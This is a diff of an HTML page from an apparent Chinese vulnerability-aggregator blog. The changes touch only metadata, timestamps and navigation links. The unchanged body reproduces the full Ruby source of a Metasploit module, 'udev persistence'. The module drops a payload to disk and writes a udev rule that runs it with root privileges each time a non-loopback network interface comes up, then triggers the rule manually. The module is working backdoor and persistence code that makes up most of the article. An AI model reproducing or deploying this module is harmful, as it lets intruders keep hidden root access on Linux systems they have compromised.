@@ -19,18 +19,18 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 该模块会在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的有效载荷。每次除l0之外的网络接口启动时，它都会以root权限执行。 产品名称： udev 来源： https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-frame">
+    <meta name="description" content="漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 此模块将在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的payload。每次网络接口（除了l0）启动时，它将以root权限执行。 产品名称： udev 来源： https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-fra">
 <meta property="og:type" content="article">
 <meta property="og:title" content="udev persistence">
-<meta property="og:url" content="http://example.com/2025/06/04/github_1868489514/index.html">
+<meta property="og:url" content="http://example.com/2025/06/04/github_2528625304/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 该模块会在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的有效载荷。每次除l0之外的网络接口启动时，它都会以root权限执行。 产品名称： udev 来源： https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-frame">
+<meta property="og:description" content="漏洞名称： udev persistence 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： 此模块将在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的payload。每次网络接口（除了l0）启动时，它将以root权限执行。 产品名称： udev 来源： https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-fra">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-04T11:15:37.460Z">
-<meta property="article:modified_time" content="2025-06-04T11:15:37.457Z">
+<meta property="article:published_time" content="2025-06-04T11:45:13.729Z">
+<meta property="article:modified_time" content="2025-06-04T11:45:13.725Z">
 <meta property="article:author" content="lianccc">
 <meta property="article:tag" content="权限提升">
-<meta property="article:tag" content="rapid7&#x2F;metasploit-framework:github issues">
+<meta property="article:tag" content="rapid7&#x2F;metasploit-framework:github commit">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-04 11:15" pubdate>
-          2025年6月4日 上午
+        <time datetime="2025-06-04 11:45" pubdate>
+          2025年6月4日 中午
         </time>
       </span>
     
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          513 字
+          507 字
         
       </span>
     
@@ -281,10 +281,10 @@
                 <p><strong>漏洞名称：</strong> udev persistence</p>
 <p><strong>漏洞类型：</strong> 权限提升</p>
 <p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> 该模块会在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的有效载荷。每次除l0之外的网络接口启动时，它都会以root权限执行。</p>
+<p><strong>漏洞描述：</strong> 此模块将在&#x2F;lib&#x2F;udev&#x2F;rules.d&#x2F;中添加一个脚本，以便执行磁盘上的payload。每次网络接口（除了l0）启动时，它将以root权限执行。</p>
 <p><strong>产品名称：</strong> udev</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/680638529298586ead0df35e71bb1a0c5683a924/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb">https://github.com/rapid7/metasploit-framework/blob/680638529298586ead0df35e71bb1a0c5683a924/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb</a></p>
-<p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/5fbf46ba7f99c77a91bc7e7de757e1f91258fb84/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb">https://github.com/rapid7/metasploit-framework/blob/5fbf46ba7f99c77a91bc7e7de757e1f91258fb84/modules%2Fexploits%2Flinux%2Flocal%2Fudev_persistence.rb</a></p>
+<p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github commit</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>##<br># This module requires Metasploit: https://metasploit.com/download<br># <span class="hljs-keyword">Current</span> source: https://github.com/rapid7/metasploit-framework<br>##<br><br><span class="hljs-keyword">class</span> MetasploitModule &lt; Msf::Exploit::<span class="hljs-keyword">Local</span><br><br>  Rank = GreatRanking<br><br>  <span class="hljs-keyword">include</span> Msf::Post::File<br>  <span class="hljs-keyword">include</span> Msf::Post::Unix<br><br>  def initialize(<span class="hljs-keyword">info</span> = &#123;&#125;)<br>    super(<br>      update_info(<br>        <span class="hljs-keyword">info</span>,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;udev persistence&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module will <span class="hljs-keyword">add</span> a script <span class="hljs-keyword">in</span> /lib/udev/rules.d/ <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> a payload written <span class="hljs-keyword">on</span> disk.<br>          It<span class="hljs-string">&#x27;ll be executed with root privileges everytime a network interface other than l0 comes up.</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        &#x27;</span>Licens<span class="hljs-string">e&#x27; =&gt; MSF_LICENSE,</span><br><span class="hljs-string">        &#x27;</span>Author<span class="hljs-string">&#x27; =&gt; [</span><br><span class="hljs-string">          &#x27;</span>Julien Voisin<span class="hljs-string">&#x27;</span><br><span class="hljs-string">        ],</span><br><span class="hljs-string">        &#x27;</span>Platform<span class="hljs-string">&#x27; =&gt; [ &#x27;</span>unix<span class="hljs-string">&#x27;, &#x27;</span>linux<span class="hljs-string">&#x27; ],</span><br><span class="hljs-string">        &#x27;</span>Arch<span class="hljs-string">&#x27; =&gt; ARCH_CMD,</span><br><span class="hljs-string">        &#x27;</span>SessionTypes<span class="hljs-string">&#x27; =&gt; [ &#x27;</span>shell<span class="hljs-string">&#x27;, &#x27;</span>meterpreter<span class="hljs-string">&#x27; ],</span><br><span class="hljs-string">        &#x27;</span>DefaultOptions<span class="hljs-string">&#x27; =&gt; &#123; &#x27;</span>WfsDelay<span class="hljs-string">&#x27; =&gt; 90_000 &#125;,</span><br><span class="hljs-string">        &#x27;</span>Targets<span class="hljs-string">&#x27; =&gt; [ [&#x27;</span>Automatic<span class="hljs-string">&#x27;, &#123;&#125;] ],</span><br><span class="hljs-string">        &#x27;</span>DefaultTarget<span class="hljs-string">&#x27; =&gt; 0,</span><br><span class="hljs-string">        &#x27;</span>DisclosureDat<span class="hljs-string">e&#x27; =&gt; &#x27;</span><span class="hljs-number">1999</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">        &#x27;</span>Passiv<span class="hljs-string">e&#x27; =&gt; true,</span><br><span class="hljs-string">        &#x27;</span>Stanc<span class="hljs-string">e&#x27; =&gt; Msf::Exploit::Stance::Passive,</span><br><span class="hljs-string">        &#x27;</span>Notes<span class="hljs-string">&#x27; =&gt; &#123;</span><br><span class="hljs-string">          &#x27;</span>Stability<span class="hljs-string">&#x27; =&gt; [],</span><br><span class="hljs-string">          &#x27;</span>Reliability<span class="hljs-string">&#x27; =&gt; [EVENT_DEPENDENT],</span><br><span class="hljs-string">          &#x27;</span>SideEffects<span class="hljs-string">&#x27; =&gt; [ARTIFACTS_ON_DISK]</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        &#x27;</span><span class="hljs-keyword">References</span><span class="hljs-string">&#x27; =&gt; [</span><br><span class="hljs-string">          [&#x27;</span>URL<span class="hljs-string">&#x27;, &#x27;</span>https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp<span class="hljs-string">&#x27;],</span><br><span class="hljs-string">          [&#x27;</span>URL<span class="hljs-string">&#x27;, &#x27;</span>https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-<span class="hljs-keyword">for</span>-persistence/<span class="hljs-string">&#x27;],</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      )</span><br><span class="hljs-string">    )</span><br><span class="hljs-string">    register_options([</span><br><span class="hljs-string"></span><br><span class="hljs-string">      OptString.new(&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;, [false, &#x27;</span>The payload\<span class="hljs-string">&#x27;s path on disk&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]),<br>      OptString.<span class="hljs-built_in">new</span>(<span class="hljs-string">&#x27;BACKDOOR_PATH&#x27;</span>, [<span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;The backdoor\&#x27;</span>s <span class="hljs-type">path</span> <span class="hljs-keyword">on</span> disk<span class="hljs-string">&#x27;, &#x27;&#x27;])</span><br><span class="hljs-string">    ])</span><br><span class="hljs-string">  end</span><br><span class="hljs-string"></span><br><span class="hljs-string">  def get_command</span><br><span class="hljs-string">    unless executable? &#x27;</span>/usr/bin/at<span class="hljs-string">&#x27;</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &#x27;</span>The required /usr/bin/at binary was <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">on</span> the target<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string">    %(/usr/bin/at -M -f #&#123;@payload_path&#125; now)</span><br><span class="hljs-string">  end</span><br><span class="hljs-string"></span><br><span class="hljs-string">  def exploit</span><br><span class="hljs-string">    @payload_path = datastore[&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;].blank? ? &#x27;</span>/usr/bin/<span class="hljs-string">&#x27; + Rex::Text.rand_text_alphanumeric(8) : datastore[&#x27;</span>PAYLOAD_PATH<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @backdoor_path = datastore[&#x27;</span>BACKDOOR_PATH<span class="hljs-string">&#x27;].blank? ? &#x27;</span>/lib/udev/rules.d/<span class="hljs-string">&#x27; + Rex::Text.rand_text_alphanumeric(8) + &#x27;</span>.rules<span class="hljs-string">&#x27; : datastore[&#x27;</span>BACKDOOR_PATH<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">    unless writable? File.dirname(@backdoor_path)</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@backdoor_path&#125; is not writable&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if exists? @backdoor_path</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@backdoor_path&#125; is already present&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    unless writable? File.dirname(@payload_path)</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@payload_path&#125; is not writable&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if exists? @payload_path</span><br><span class="hljs-string">      fail_with Failure::BadConfig, &quot;#&#123;@payload_path&#125; is already present&quot;</span><br><span class="hljs-string">    end</span><br><span class="hljs-string"></span><br><span class="hljs-string">    upload_and_chmodx(@payload_path, &quot;#!/bin/sh\n#&#123;payload.encoded&#125;&quot;)</span><br><span class="hljs-string">    print_status &quot;#&#123;@payload_path&#125; written&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    fail_with Failure::PayloadFailed, &#x27;</span>Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">write</span> UDEV fil<span class="hljs-string">e&#x27; unless write_file(@backdoor_path, %(SUBSYSTEM==&quot;net&quot;, KERNEL!=&quot;lo&quot;, RUN+=&quot;#&#123;get_command&#125;&quot;))</span><br><span class="hljs-string"></span><br><span class="hljs-string">    print_status &quot;#&#123;@backdoor_path&#125; written&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # need to trigger first rule manually</span><br><span class="hljs-string">    print_status &#x27;</span>Triggering udev rul<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">    cmd_exec(&#x27;</span>udevadm <span class="hljs-keyword">trigger</span> -v <span class="hljs-comment">--subsystem-match=net&#x27;)</span><br><br>    stime = <span class="hljs-type">Time</span>.now.to_f<br>    timeout = datastore[<span class="hljs-string">&#x27;ListenerTimeout&#x27;</span>].to_i<br>    <span class="hljs-keyword">loop</span> <span class="hljs-keyword">do</span><br>      break <span class="hljs-keyword">if</span> timeout &gt; <span class="hljs-number">0</span> &amp;&amp; (stime + timeout &lt; <span class="hljs-type">Time</span>.now.to_f)<br><br>      Rex::ThreadSafe.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>
 
 
@@ -322,7 +322,7 @@
       
         <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="print-no-link">#权限提升</a>
       
-        <a href="/tags/rapid7-metasploit-framework-github-issues/" class="print-no-link">#rapid7/metasploit-framework:github issues</a>
+        <a href="/tags/rapid7-metasploit-framework-github-commit/" class="print-no-link">#rapid7/metasploit-framework:github commit</a>
       
     </div>
   
@@ -335,7 +335,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>udev persistence</div>
-      <div>http://example.com/2025/06/04/github_1868489514/</div>
+      <div>http://example.com/2025/06/04/github_2528625304/</div>
     </div>
     <div class="license-meta">
       
@@ -379,9 +379,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/04/github_2528625304/" title="udev persistence">
+                      <a href="/2025/06/04/github_2520693830/" title="D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">udev persistence</span>
+                        <span class="hidden-mobile">D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -389,8 +389,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/04/github_447170763/" title="TotoLink Router setMacFilterRules - Command Injection">
-                        <span class="hidden-mobile">TotoLink Router setMacFilterRules - Command Injection</span>
+                      <a href="/2025/06/04/github_1868489514/" title="udev persistence">
+                        <span class="hidden-mobile">udev persistence</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
